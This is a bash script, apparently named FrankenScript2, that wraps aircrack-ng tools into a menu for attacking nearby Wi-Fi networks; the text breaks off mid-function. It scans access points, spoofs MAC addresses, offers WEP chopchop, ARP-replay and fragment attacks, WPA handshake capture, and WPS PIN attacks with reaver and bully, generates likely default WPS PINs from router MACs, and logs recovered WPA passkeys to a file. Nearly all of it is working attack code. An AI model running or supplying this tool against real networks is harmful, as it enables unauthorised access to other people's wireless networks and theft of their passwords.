#!/bin/bash
#
#
printf '\033[8;24;85t'
RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)

Main_Menu(){

Active_System_Mode_Check=$(airmon-ng | grep mon0 | cut -c 1-4)
if [[ $Active_System_Mode_Check ]]; then
   Active_System_Mode=$(echo Attack Mode Is Enabled)
else
   Active_System_Mode=$(echo Networking Mode Is Enabled)
fi

clear
echo $RED"###################################"
echo "#   $STAND      FrankenScript2         $RED #"
echo "###################################"
echo "# $GREEN[1]$BLUE Scan And Attack AP's       $RED #"
echo "# $GREEN[2]$BLUE Return To Scanned AP's     $RED #"
echo "# $GREEN[3]$BLUE Attack Handshake.cap Files $RED #"
echo "# $GREEN[4]$BLUE Script Launcher            $RED #"
echo "#                                 #"
echo "# $GREEN[5]$BLUE WiFi Adapter Override      $RED #"
echo "# $GREEN[6]$BLUE System Mode Override       $RED #"
echo "# $GREEN[7]$BLUE Recovered Passkey's        $RED #"
echo "# $GREEN[8]$BLUE FrankenScript2 Information $RED #"
echo "# $GREEN[0]$BLUE Exit FrankenScript2        $RED #"
echo "###################################"$STAND
echo ""
echo $RED"Available WiFi Devices:$STAND $WiFi_Adapters"
echo $RED"System Mode Status:$STAND $Active_System_Mode"

MAC_Display=$(airmon-ng | grep mon0 | cut -c 1-4)
if [[ $MAC_Display ]]; then
   Permanent_MAC_wlanX=$(macchanger -s $wlanX | grep "Permanent" | sed 's/Permanent MAC: //g')
   echo $RED$wlanX Permanent MAC: $STAND$Permanent_MAC_wlanX
   Fake_MAC_wlanX=$(macchanger -s $wlanX | grep "Current" | sed 's/Current   MAC: //g')
   echo $RED$wlanX Current MAC: $STAND$Fake_MAC_wlanX
   Fake_MAC_mon0=$(macchanger -s mon0 | grep "Current" | sed 's/Current   MAC: //g')
   echo $RED"mon0" Current MAC: $STAND$Fake_MAC_mon0
else
   Permanent_MAC_wlanX=$(macchanger -s $wlanX | grep "Permanent" | sed 's/Permanent MAC: //g')
   echo $RED$wlanX Permanent MAC: $STAND$Permanent_MAC_wlanX
   Fake_MAC_wlanX=$(macchanger -s $wlanX | grep "Current" | sed 's/Current   MAC: //g')
   echo $RED$wlanX Current MAC: $STAND$Fake_MAC_wlanX
fi

echo ""
read -p $GREEN"Please choose an option:$STAND " Main_Menu_Options

if [[ $Main_Menu_Options == "1" ]]; then
   Attack_Mode_Check=$(airmon-ng | grep mon0 | cut -c 1-4)
   if [[ $Attack_Mode_Check ]]; then
      clear
      Scan_For_Networks
   else
      Enable_Attack_Mode
      Scan_For_Networks
   fi
fi

if [[ $Main_Menu_Options == "2" ]]; then
   if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt ]]; then
      Attack_Mode_Check=$(airmon-ng | grep mon0 | cut -c 1-4)
      if [[ $Attack_Mode_Check ]]; then
         clear
         Scanned_APs
      else
         Enable_Attack_Mode
         Scanned_APs
      fi
   else
      Attack_Mode_Check=$(airmon-ng | grep mon0 | cut -c 1-4)
      if [[ $Attack_Mode_Check ]]; then
         clear
         Scan_For_Networks
      else
         Enable_Attack_Mode
         Scan_For_Networks
      fi
   fi
fi

if [[ $Main_Menu_Options == "3" ]]; then
   Attack_Handshake_File
fi

if [[ $Main_Menu_Options == "4" ]]; then
   Script_Launcher
fi

if [[ $Main_Menu_Options == "5" ]]; then
   WiFi_Adapter_Settings
fi

if [[ $Main_Menu_Options == "6" ]]; then
   System_Mode_Settings
fi

if [[ $Main_Menu_Options == "7" ]]; then
   gnome-open $HOME/FrankenScript2/Recovered-Passkeys.txt
fi

if [[ $Main_Menu_Options == "8" ]]; then
   gnome-open $HOME/FrankenScript2/FankenScript2_Info.txt
fi

if [[ $Main_Menu_Options == "0" ]]; then
   Attack_Mode_Check=$(airmon-ng | grep mon0 | cut -c 1-4)
   if [[ $Attack_Mode_Check ]]; then
      Enable_Networking_Mode
   else
      echo ""
   fi
   exit
fi
}

WiFi_Adapter_Settings(){
WiFi_Adapters_Check=$(airmon-ng | grep "wlan" | nl -ba -w 1  -s ': ')
if grep -q "2" <<< "$WiFi_Adapters_Check" ; then
   Multiple_WiFi_Adapters_Available=$(airmon-ng | grep "wlan" | tac | rev | sed 's/^.........//' | rev | column -t | nl -ba -w 1  -s ': ')
   clear
   echo "$Multiple_WiFi_Adapters_Available"
   echo ""
   echo $RED"Multiple WiFi adapters were detected"$STAND
   read -p $GREEN"Please choose a WiFi adapter:$STAND " grep_Line_Number
   wlanX=$(airmon-ng | grep "wlan" | tac | rev | sed 's/^.........//' | rev | column -t | nl -ba -w 1  -s ': ' | sed -n ""$grep_Line_Number"p" | awk '{ print $2 }')
   WiFi_Adapters=$(echo Multiple)
else
   echo ""
   wlanX=$(airmon-ng | grep "wlan" | awk '{ print $1 }')
   WiFi_Adapters=$(echo Single)
fi
}

System_Mode_Settings(){
Attack_Mode_Check=$(airmon-ng | grep mon0 | cut -c 1-4)
if [[ $Attack_Mode_Check ]]; then
   Enable_Networking_Mode
else
   Enable_Attack_Mode
fi

Main_Menu
}

Enable_Attack_Mode(){
clear
WiFi_Adapter_Settings
clear
echo "$GREEN[1]$BLUE = airmon-ng check kill."$STAND
echo "$GREEN[2]$BLUE = Continue Without Killing Processes."$STAND
read -p $GREEN"Please choose an option?:$STAND " Kill_Processes_Options

if [[ $Kill_Processes_Options == "1" ]]; then
   clear
   airmon-ng check kill
fi

if [[ $Kill_Processes_Options == "2" ]]; then
   clear
   echo "Proceeding without killing any processes"
fi

clear
airmon-ng start $wlanX

MAC_Address_Options
}

MAC_Address_Options(){
clear
echo $RED"$wlanX:"$STAND
macchanger -s $wlanX
echo $RED"mon0:"$STAND
macchanger -s mon0
echo ""
echo $GREEN"[1]$BLUE = Set A Random MAC address.$STAND"
echo $GREEN"[2]$BLUE = Set A Custom MAC Address.$STAND"
echo $GREEN"[3]$BLUE = Continue Without Changing The MAC Address.$STAND"
read -p $GREEN"Please choose an option$STAND: " MACoption

if [[ $MACoption == "1" ]]; then
   clear
   echo $RED"Auto Setting A Random MAC Address.$STAND"
   echo $RED"Please wait..."$STAND
   ifconfig $wlanX down
   ifconfig mon0 down
   wlanXmac=$(macchanger -r $wlanX | grep "New" | cut -c 16-32)
   echo ""
   macchanger --mac $wlanXmac mon0
   ifconfig $wlanX up
   ifconfig mon0 up
   echo ""
   echo $RED"MAC address for$STAND $wlanX:"
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for$STAND mon0:"
   macchanger -s mon0
   sleep 2
fi

if [[ $MACoption == "2" ]]; then
   clear
   echo $RED"Set A User specified MAC Address.$STAND"
   echo $RED"Please wait..."$STAND
   ifconfig $wlanX down
   ifconfig mon0 down
   echo ""
   echo $RED"Setting a random MAC address."$STAND
   macchanger -r $wlanX
   echo ""
   read -p $GREEN"Input any mac address you want to use?.$STAND " SpecifiedInterfaceMAC
   macchanger --mac $SpecifiedInterfaceMAC $wlanX
   macchanger --mac $SpecifiedInterfaceMAC mon0
   ifconfig $wlanX up
   ifconfig mon0 up
   echo ""
   echo $RED"MAC address for$STAND $wlanX:"$STAND
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for$STAND mon0:"$STAND
   macchanger -s mon0
   sleep 2
fi

if [[ $MACoption == "3" ]]; then
   clear
   echo $RED"Proceeding without change the mac address..."$STAND
   echo ""
   echo $RED"MAC address for$STAND $wlanX:"$STAND
   macchanger -s $wlanX
   echo ""
   echo $RED"MAC address for$STAND mon0:"$STAND
   macchanger -s mon0
   sleep 2
fi
}

Enable_Networking_Mode(){
clear
airmon-ng > $HOME/FrankenScript2/Temp_Working_Dirctory/Interface_Check0.txt
sleep 1
cat $HOME/FrankenScript2/Temp_Working_Dirctory/Interface_Check0.txt | awk '{ print $1 }' > $HOME/FrankenScript2/Temp_Working_Dirctory/Interface_Check1.txt
sleep 1
sed -i '1,4d' $HOME/FrankenScript2/Temp_Working_Dirctory/Interface_Check1.txt
sed -i '$d' $HOME/FrankenScript2/Temp_Working_Dirctory/Interface_Check1.txt
sed -i 's/^/airmon-ng stop /' $HOME/FrankenScript2/Temp_Working_Dirctory/Interface_Check1.txt
echo '#!/bin/bash' > $HOME/FrankenScript2/Temp_Working_Dirctory/Interface_Check2.txt
cat $HOME/FrankenScript2/Temp_Working_Dirctory/Interface_Check2.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Interface_Check1.txt > $HOME/FrankenScript2/Temp_Working_Dirctory/Kill_Monitor_Modes.sh
sed -i '/airmon-ng/{x;p;x;G;}' $HOME/FrankenScript2/Temp_Working_Dirctory/Kill_Monitor_Modes.sh
sed -i 's/^$/sleep 1/g' $HOME/FrankenScript2/Temp_Working_Dirctory/Kill_Monitor_Modes.sh
sed -i '$!N; /^\(.*\)\n\1$/!P; D' $HOME/FrankenScript2/Temp_Working_Dirctory/Kill_Monitor_Modes.sh
chmod +x $HOME/FrankenScript2/Temp_Working_Dirctory/Kill_Monitor_Modes.sh
sleep 1
$HOME/FrankenScript2/Temp_Working_Dirctory/Kill_Monitor_Modes.sh
sleep 1
service network-manager start

rm $HOME/FrankenScript2/Temp_Working_Dirctory/Interface_Check0.txt
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Interface_Check1.txt
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Interface_Check2.txt
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Kill_Monitor_Modes.sh
}

Scan_For_Networks(){

rm $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan* &> /dev/null
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Wash_Network_Scan.txt &> /dev/null
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Pins* &> /dev/null

clear
xterm -geometry 100x48+675+0 -e airodump-ng mon0 -w $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan &
xterm -geometry 111x23+0+350 -l -lf $HOME/FrankenScript2/Temp_Working_Dirctory/Wash_Network_Scan.txt -e wash -i mon0 &
clear
read -p $GREEN"Press [Enter] to stop the airodump scan and continue.$STAND"
killall airodump-ng
read -p $GREEN"Press [Enter] to stop the wash scan and continue.$STAND"
killall wash

rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.cap
rm $HOME/FrankenScript2/Temp_Working_Dirctory/*.csv

cat $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan-01.kismet.netxml | sed -e 's/<encryption>/PRINT-<encryption>/g' -e 's/<max_signal_dbm>/PRINT-<max_signal_dbm>/g' -e 's/<essid/PRINT-<essid/g' -e 's/<BSSID>/PRINT-<BSSID>/g' -e 's/<channel>/PRINT-<channel>/g' -e 's/<channel>/PRINT-<channel>/g' | grep "PRINT-" | sed -e 's/PRINT-<encryption>/\nPRINT-<encryption>/g' -e 's/^[ \t]*//;s/[ \t]*$//' -e 's/PRINT-<essid cloaked="false">//g' -e 's/PRINT-<BSSID>//g' -e 's/PRINT-PRINT-<channel>//g' -e 's/PRINT-<max_signal_dbm>//g' -e 's/ <\/encryption>//g' -e 's/<\/essid>//g' -e 's/<\/BSSID>//g' -e 's/<\/channel>//g' -e 's/<\/max_signal_dbm>//g' > $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan.txt

paste -d, -s $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan.txt | sed -e 's/,,/ /g' -e 's/,/ /g' -e 's/PRINT-<encryption>/\n/g' -e 's/WPA TKIP/WPA-TKIP/g' -e 's/WPA2 AES-CCM/WPA2-AES-CCM/g' -e 's/CCM TKIP/CCM-TKIP/g' -e 's/WPA2 WPA/WPA2-WPA/g' -e 's/WPA2 AES/WPA2-AES/g' -e 's/WPA AES/WPA-AES/g' > $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan1.txt

awk '{ print $1 " " $2 " " $3 " " $4 }' $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan1.txt > $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan2.txt

cat $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan1.txt | rev | awk '{ print $1 }' | rev > $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan3.txt

paste -d' ' $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan2.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan3.txt > $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan4.txt

awk '{ print $2 " " $5 " " $1 " " $3 " " $4 }' $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan4.txt | sed '/cloaked/d' | sort -k 2 | column -t > $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan5.txt

cat $HOME/FrankenScript2/Temp_Working_Dirctory/Wash_Network_Scan.txt | sed '1,6d' | awk '{ print $6 " " $3 " " $4 " " $5 " " $1 " " $2}' | sed 's/\r -/ -/g' | sed 's/ 1.0 /  /g' | sed 's/No/WPS-Locked-No/g' | sed 's/Yes/WPS-Locked-Yes/g' | sort -k 2 | column -t > $HOME/FrankenScript2/Temp_Working_Dirctory/Wash_Network_Scan1.txt

rm $HOME/FrankenScript2/Temp_Working_Dirctory/Wash_Network_Scan.txt

cat $HOME/FrankenScript2/Temp_Working_Dirctory/Wash_Network_Scan1.txt $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan5.txt | column -t > $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt

sed -i '/ OPN /d' $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt

rm $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan.txt
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan1.txt
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan2.txt
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan3.txt
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan4.txt
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan5.txt
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Wash_Network_Scan1.txt
rm $HOME/FrankenScript2/Temp_Working_Dirctory/Airodump_Network_Scan-01.kismet.netxml

Scanned_APs
}

Scanned_APs(){
clear
Scanned_APs=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt | nl -ba -w 1  -s ': ' | column -t | tac)
clear
echo $RED"Scanned_APs"$STAND
echo $RED"==========="$STAND
echo ""
echo "$Scanned_APs"
echo ""
echo $GREEN"[r] = Re-Scan"$STAND
echo $GREEN"[e] = Sort By - ESSID (AP Name)"$STAND
echo $GREEN"[s] = Sort By - Signal Strength"$STAND
echo $GREEN"[a] = Sort By - Attack Method"$STAND
echo $GREEN"[0] = Return To Main Menu"$STAND
read -p $GREEN"Please choose an option or input the number of a target:$STAND " grep_AP_line_number

if [[ $grep_AP_line_number == "r" ]]; then
   Scan_For_Networks
fi

if [[ $grep_AP_line_number == "e" ]]; then
   Scanned_APs_Sorted_By_ESSID
fi

if [[ $grep_AP_line_number == "s" ]]; then
   Scanned_APs_Sorted_By_Signal
fi

if [[ $grep_AP_line_number == "a" ]]; then
   Scanned_APs_Sorted_By_Attack_Method
fi

if [[ $grep_AP_line_number == "0" ]]; then
   Main_Menu
fi

cat $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt | sed -n ""$grep_AP_line_number"p" > $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt

Attack_Detection_And_Options
}

Scanned_APs_Sorted_By_ESSID(){
clear
cat $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt | sort -k 1 | tac > $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs_Sorted_By_ESSID.txt

Scanned_APs=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs_Sorted_By_ESSID.txt | nl -ba -w 1  -s ': ' | column -t | tac)
clear
echo $RED"Scanned_APs"$STAND
echo $RED"==========="$STAND
echo ""
echo "$Scanned_APs"
echo ""
echo $GREEN"[r] = Re-Scan"$STAND
echo $GREEN"[p] = Sort By - Original Scan"$STAND
echo $GREEN"[s] = Sort By - Signal Strength"$STAND
echo $GREEN"[a] = Sort By - Attack Method"$STAND
echo $GREEN"[0] = Return To Main Menu"$STAND
read -p $GREEN"Please choose an option or input the number of a target:$STAND " grep_AP_line_number

if [[ $grep_AP_line_number == "r" ]]; then
   Scan_For_Networks
fi

if [[ $grep_AP_line_number == "p" ]]; then
   Scanned_APs
fi

if [[ $grep_AP_line_number == "s" ]]; then
   Scanned_APs_Sorted_By_Signal
fi

if [[ $grep_AP_line_number == "a" ]]; then
   Scanned_APs_Sorted_By_Attack_Method
fi

if [[ $grep_AP_line_number == "0" ]]; then
   Main_Menu
fi

cat $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs_Sorted_By_ESSID.txt | sed -n ""$grep_AP_line_number"p" > $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt

Attack_Detection_And_Options
}

Scanned_APs_Sorted_By_Signal(){
clear
cat $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt | sort -k 2 > $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs_Sorted_By_Signal.txt

Scanned_APs=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs_Sorted_By_Signal.txt | nl -ba -w 1  -s ': ' | column -t | tac)
clear
echo $RED"Scanned_APs"$STAND
echo $RED"==========="$STAND
echo ""
echo "$Scanned_APs"
echo ""
echo $GREEN"[r] = Re-Scan"$STAND
echo $GREEN"[p] = Sort By - Original Scan"$STAND
echo $GREEN"[e] = Sort By - ESSID (AP Name)"$STAND
echo $GREEN"[a] = Sort By - Attack Method"$STAND
echo $GREEN"[0] = Return To Main Menu"$STAND
read -p $GREEN"Please choose an option or input the number of a target:$STAND " grep_AP_line_number

if [[ $grep_AP_line_number == "r" ]]; then
   Scan_For_Networks
fi

if [[ $grep_AP_line_number == "p" ]]; then
   Scanned_APs
fi

if [[ $grep_AP_line_number == "e" ]]; then
   Scanned_APs_Sorted_By_ESSID
fi

if [[ $grep_AP_line_number == "a" ]]; then
   Scanned_APs_Sorted_By_Attack_Method
fi

if [[ $grep_AP_line_number == "0" ]]; then
   Main_Menu
fi

cat $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs_Sorted_By_Signal.txt | sed -n ""$grep_AP_line_number"p" > $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt

Attack_Detection_And_Options
}

Scanned_APs_Sorted_By_Attack_Method(){
clear
cat $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs.txt | sort -k 3 | tac > $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs_Sorted_By_Attack_Method.txt

Scanned_APs=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs_Sorted_By_Attack_Method.txt | nl -ba -w 1  -s ': ' | column -t | tac)
clear
echo $RED"Scanned_APs"$STAND
echo $RED"==========="$STAND
echo ""
echo "$Scanned_APs"
echo ""
echo $GREEN"[r] = Re-Scan"$STAND
echo $GREEN"[p] = Sort By - Original Scan"$STAND
echo $GREEN"[e] = Sort By - ESSID (AP Name)"$STAND
echo $GREEN"[s] = Sort By - Signal Strength"$STAND
echo $GREEN"[0] = Return To Main Menu"$STAND
read -p $GREEN"Please choose an option or input the number of a target:$STAND " grep_AP_line_number

if [[ $grep_AP_line_number == "r" ]]; then
   Scan_For_Networks
fi

if [[ $grep_AP_line_number == "p" ]]; then
   Scanned_APs
fi

if [[ $grep_AP_line_number == "e" ]]; then
   Scanned_APs_Sorted_By_ESSID
fi

if [[ $grep_AP_line_number == "s" ]]; then
   Scanned_APs_Sorted_By_Signal
fi

if [[ $grep_AP_line_number == "0" ]]; then
   Main_Menu
fi

cat $HOME/FrankenScript2/Temp_Working_Dirctory/Scanned_APs_Sorted_By_Attack_Method.txt | sed -n ""$grep_AP_line_number"p" > $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt

Attack_Detection_And_Options
}

Attack_Detection_And_Options(){

Attack_Method_WPS=$(grep WPS $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt)
if [[ $Attack_Method_WPS ]]; then

   while :
   do

   clear
   echo $GREEN"[1]$BLUE = Reaver Attacks.$STAND"
   echo $GREEN"[2]$BLUE = Bully Attacks.$STAND"
   echo $GREEN"[3]$BLUE = AP Default Passkey Keygens.$STAND"
   echo $GREEN"[0]$BLUE = Return To Scanned APs.$STAND"
   read -p $GREEN"Please choose an option$STAND: " WPS_Options

   if [[ $WPS_Options == "1" ]]; then
      Reaver_Attacks
   fi

   if [[ $WPS_Options == "2" ]]; then
      Bully_Attacks
   fi

   if [[ $WPS_Options == "3" ]]; then
      AP_Default_Passkey_Keygens
   fi

   if [[ $WPS_Options == "0" ]]; then
      Scanned_APs
   fi

   done
fi

Attack_Method_WEP=$(grep WEP $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt)
if [[ $Attack_Method_WEP ]]; then

   while :
   do

   Clean_Temp_Folder

   clear
   echo $GREEN"[1]$BLUE = WEP Chopchop Without Association.$STAND"
   echo $GREEN"[2]$BLUE = WEP ARPreplay With Association.$STAND"
   echo $GREEN"[3]$BLUE = WEP Chopchop With Association.$STAND"
   echo $GREEN"[4]$BLUE = WEP Fragment With Association.$STAND"
   echo $GREEN"[5]$BLUE = AP Default Passkey Keygens.$STAND"
   echo $GREEN"[0]$BLUE = Return To Scanned APs.$STAND"
   read -p $GREEN"Please choose an option$STAND: " WEP_Options

   if [[ $WEP_Options == "1" ]]; then
      WEP_Chopchop_Without_Association
   fi

   if [[ $WEP_Options == "2" ]]; then
      WEP_ARPreplay_With_Association
   fi

   if [[ $WEP_Options == "3" ]]; then
      WEP_Chopchop_With_Association
   fi

   if [[ $WEP_Options == "4" ]]; then
      WEP_Fragment_With_Association
   fi

   if [[ $WEP_Options == "5" ]]; then
      AP_Default_Passkey_Keygens
   fi

   if [[ $WEP_Options == "0" ]]; then
      Scanned_APs
   fi

   done
fi

Attack_Method_Handshake_Or_WPS=$(grep -e WPA2 -e WPA -e AES -e CCM -e TKIP -e OPN $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt)
if [[ $Attack_Method_Handshake_Or_WPS ]]; then

   while :
   do

   clear
   echo $GREEN"[1]$BLUE = WPA/WPA2 Handshake Capture.$STAND"
   echo $GREEN"[2]$BLUE = WPS Attacks.$STAND"
   echo $GREEN"[3]$BLUE = AP Default Passkey Keygens.$STAND"
   echo $GREEN"[0]$BLUE = Return To Scanned APs.$STAND"
   read -p $GREEN"Please choose an option$STAND: " WPA_WPA2_Options

   if [[ $WPA_WPA2_Options == "1" ]]; then
      WPA_WPA2_Attacks
   fi

   if [[ $WPA_WPA2_Options == "2" ]]; then
      clear
      echo $GREEN"[1]$BLUE = Reaver Attacks.$STAND"
      echo $GREEN"[2]$BLUE = Bully Attacks.$STAND"
      echo $GREEN"[0]$BLUE = Return To Scanned APs.$STAND"
      read -p $GREEN"Please choose an option$STAND: " WPS_Options

      if [[ $WPS_Options == "1" ]]; then
         Reaver_Attacks
      fi

      if [[ $WPS_Options == "2" ]]; then
         Bully_Attacks
      fi

      if [[ $WPS_Options == "0" ]]; then
         Scanned_APs
      fi
   fi

   if [[ $WPA_WPA2_Options == "3" ]]; then
      AP_Default_Passkey_Keygens
   fi

   if [[ $WPA_WPA2_Options == "0" ]]; then
      Scanned_APs
   fi

   done
fi
}

Reaver_Attacks(){

AP_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $1 }')
AP_bssid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $4 }')
AP_channel=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Chosen_AP_Line.txt | awk '{ print $5 }')

Reaver_Attack_Options(){

clear
echo $GREEN"[1]$BLUE = Reaver & Default WPS Pin Keygens.$STAND"
echo $GREEN"[2]$BLUE = Reaver Basic Settings.$STAND"
echo $GREEN"[3]$BLUE = Reaver Custom Settings.$STAND"
echo $GREEN"[0]$BLUE = Return To Scanned APs.$STAND"
read -p $GREEN"Please choose an option$STAND: " WPS_Option

if [[ $WPS_Option == "1" ]]; then
   Reaver_And_Default_WPS_Pin_Keygens
fi

if [[ $WPS_Option == "2" ]]; then
   Reaver_Basic_Settings
fi

if [[ $WPS_Option == "3" ]]; then
   Reaver_Custom_Settings
fi

if [[ $WPS_Option == "0" ]]; then
   Scanned_APs
fi
}

Reaver_And_Default_WPS_Pin_Keygens(){

clear
MAC_Address_Options

PinMAC1=$(echo $AP_bssid | sed 's/://g' | cut -c 7-12)
PinMAC2=$(echo $AP_bssid | sed 's/://g' | cut -c 1-6)
WPSpin1=`python $HOME/FrankenScript2/Scripts/WPSpin.py $PinMAC1 | awk '{ print $7 }'`
WPSpin2=`python $HOME/FrankenScript2/Scripts/WPSpin.py $PinMAC2 | awk '{ print $7 }'`
easybox=`python $HOME/FrankenScript2/Scripts/easybox_wps.py $AP_bssid | grep "WPS pin" | cut -c 10-17`
$HOME/FrankenScript2/Scripts/WPSPIN1.5_Generator.sh
echo $WPSpin1 >> $HOME/FrankenScript2/Temp_Working_Dirctory/Pins.txt
echo $WPSpin2 >> $HOME/FrankenScript2/Temp_Working_Dirctory/Pins.txt
echo $easybox >> $HOME/FrankenScript2/Temp_Working_Dirctory/Pins.txt
awk '!_[$1]++' $HOME/FrankenScript2/Temp_Working_Dirctory/Pins.txt > $HOME/FrankenScript2/Temp_Working_Dirctory/Pins-Cleaned.txt
sed -ni '/^.\{8\}/p' $HOME/FrankenScript2/Temp_Working_Dirctory/Pins-Cleaned.txt
PinList=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Pins-Cleaned.txt)

clear
echo $RED"Possible WPS Pins:"$STAND
Presented_PinList=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Pins-Cleaned.txt | nl -ba -w 1  -s ': ')
echo ""
echo "$Presented_PinList"
echo ""
read -p $GREEN"Please input the number of your chosen pin:$STAND " grep_AP_line_number
Chosen_Pin=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Pins-Cleaned.txt | sed -n ""$grep_AP_line_number"p" | sed 's/^[ \t]*//;s/[ \t]*$//')

   clear
   echo $RED"Reaver Attack Command:"$STAND
   echo "reaver -i mon0 -c $AP_channel -b $AP_bssid -p $Chosen_Pin -d 2 -t 2 -T 2 -vv"
   echo ""
   read -p $GREEN"Press $RED[Enter]$GREEN to launch the attack.$STAND"
   clear
   reaver -i mon0 -c $AP_channel -b $AP_bssid -p $Chosen_Pin -d 2 -t 2 -T 2 -vv -C "sed -i 's/^....//' $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt && cat $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $HOME/FrankenScript2/Recovered-Passkeys.txt && echo AP BSSID: $AP_bssid >> $HOME/FrankenScript2/Recovered-Passkeys.txt && grep 'WPS PIN:' $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt >> $HOME/FrankenScript2/Recovered-Passkeys.txt && grep 'WPA PSK:' $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt >> $HOME/FrankenScript2/Recovered-Passkeys.txt && echo '' >> $HOME/FrankenScript2/Recovered-Passkeys.txt" | tee $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt

if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt ]]; then
   Reaver_Passkey_Check=$(grep PSK $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt)
   if [[ $Reaver_Passkey_Check ]]; then
      echo ""
      echo $RED"Recovered passkey & WPS pin has been coppied to$STAND $HOME/FrankenScript2/Recovered-Passkeys.txt"
      echo ""
      read -p $GREEN"Press $RED[Enter]$GREEN to continue."$STAND
   fi
fi

rm $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt
}

Reaver_Basic_Settings(){

clear
MAC_Address_Options

echo ""
echo $RED"Reaver Attack Command:"$STAND
echo "reaver -i mon0 -c $AP_channel -b $AP_bssid -vv"
echo ""
read -p $GREEN"Press $RED[Enter]$GREEN to launch the attack.$STAND"
clear
reaver -i mon0 -c $AP_channel -b $AP_bssid -vv -C "sed -i 's/^....//' $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt && cat $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt | grep 'AP SSID' | sed 's/AP SSID/AP ESSID/' >> $HOME/FrankenScript2/Recovered-Passkeys.txt && echo AP BSSID: $AP_bssid >> $HOME/FrankenScript2/Recovered-Passkeys.txt && grep 'WPS PIN:' $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt >> $HOME/FrankenScript2/Recovered-Passkeys.txt && grep 'WPA PSK:' $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt >> $HOME/FrankenScript2/Recovered-Passkeys.txt && echo '' >> $HOME/FrankenScript2/Recovered-Passkeys.txt" | tee $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt

if [[ -f $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt ]]; then
   Reaver_Passkey_Check=$(grep PSK $HOME/FrankenScript2/Temp_Working_Dirctory/reaver.txt)
   if [[ $Reaver_Passkey_Check ]]; then
      echo ""
